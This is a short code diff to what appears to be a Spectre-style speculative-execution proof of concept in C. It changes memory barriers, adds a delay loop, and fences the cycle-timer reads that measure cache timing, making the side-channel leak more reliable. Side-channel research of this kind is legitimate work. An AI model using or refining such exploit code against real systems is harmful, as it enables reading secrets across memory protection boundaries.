@@ -3,7 +3,7 @@
 #include <string.h>
 #include <assert.h>
 
-#define VERISON "2021-06-10 10:45"
+#define VERISON "2021-06-21 16:59"
 
 #ifdef X86
 #include <x86intrin.h>
@@ -56,7 +56,7 @@ inline __attribute((always_inline)) void barrier()
 	_mm_mfence();
 	#else
 	__asm__ volatile(
-		"dmb ish"
+		"dmb sy"
 	);
 	#endif
 }
@@ -103,6 +103,10 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		for (j = 29; j >= 0; j--)
 		{
 			flush_cache(&array1_size);
+			// Delay
+			#ifdef X86
+			for (volatile int z = 0; z < 100; z++) { }
+			#endif
 			barrier();
 
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
@@ -136,8 +140,10 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			junk = *addr;
 			time2 = __rdtscp(&junk) - time1;
 			#else
+			barrier();
 			time1 = read_cycles();
 			junk = *addr;				   /* MEMORY ACCESS TO TIME */
+			barrier();
 			time2 = read_cycles() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 			#endif
 
